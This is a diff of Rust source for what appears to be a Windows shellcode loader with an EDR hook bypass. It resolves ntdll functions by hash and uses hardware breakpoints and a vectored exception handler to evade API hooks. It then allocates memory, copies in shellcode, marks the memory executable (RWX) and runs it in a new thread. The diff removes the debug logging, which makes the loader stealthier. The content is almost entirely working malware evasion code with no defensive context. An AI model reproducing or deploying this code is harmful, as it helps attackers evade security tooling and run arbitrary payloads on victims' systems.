@@ -15,8 +15,6 @@ const RTL_REMOVE_VEH_HASH: u32 = crate::dbj2_hash!(b"RtlRemoveVectoredExceptionH
 
 fn execute_with_hwbp(ntdll: *mut u8, func_hash: u32, callback: &mut dyn FnMut(*mut u8) -> i32) -> Result<(), String> {
     let func_addr = unsafe { get_export_by_hash(ntdll, func_hash) }.ok_or(format!("API {:#x} not found", func_hash))?;
-    #[cfg(feature = "debug")]
-    crate::utils::print_message(&format!("API {:#x} address: {:#x}", func_hash, func_addr as usize));
 
     let hook_addr = (func_addr as usize) + 3;
     unsafe { set_hwbp(0, hook_addr, HWBPType::Execute, HWBPSize::Byte); }
@@ -33,12 +31,7 @@ fn execute_with_hwbp(ntdll: *mut u8, func_hash: u32, callback: &mut dyn FnMut(*m
 
 #[cfg(feature = "run_hook_bypass")]
 pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), String> {
-    #[cfg(feature = "debug")]
-    crate::utils::print_message("Starting Hook Bypass execution...");
-
     let ntdll = get_loaded_module_by_hash(NTDLL_HASH).ok_or("Failed to get ntdll")?;
-    #[cfg(feature = "debug")]
-    crate::utils::print_message(&format!("ntdll base: {:#x}", ntdll as usize));
 
     let rtl_add_veh_addr = get_export_by_hash(ntdll, RTL_ADD_VEH_HASH).ok_or("VEH API not found")?;
     let rtl_add_veh: RtlAddVehFn = std::mem::transmute(rtl_add_veh_addr);
@@ -61,8 +54,6 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), Str
     impl Drop for VehGuard {
         fn drop(&mut self) {
             unsafe { (self.remove_fn)(self.handle); }
-            #[cfg(feature = "debug")]
-            crate::utils::print_message("VEH removed.");
         }
     }
     let _veh_guard = VehGuard { handle: veh_handle, remove_fn: rtl_remove_veh };
@@ -75,9 +66,6 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), Str
         nt_alloc(-1, &mut base_addr, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
     })?;
 
-    #[cfg(feature = "debug")]
-    crate::utils::print_message(&format!("Memory allocated at: {:p}", base_addr));
-
     std::ptr::copy_nonoverlapping(shellcode_ptr as *const u8, base_addr as *mut u8, shellcode_len);
     
     let mut old_prot = 0;
@@ -85,9 +73,6 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), Str
         let nt_protect: NtProtectVirtualMemoryFn = std::mem::transmute(addr);
         nt_protect(-1, &mut base_addr, &mut region_size, PAGE_EXECUTE_READWRITE, &mut old_prot)
     })?;
-    
-    #[cfg(feature = "debug")]
-    crate::utils::print_message("Memory protection changed to RWX.");
 
     let mut thread_handle = 0;
     execute_with_hwbp(ntdll, NT_CREATE_THREAD_HASH, &mut |addr| {
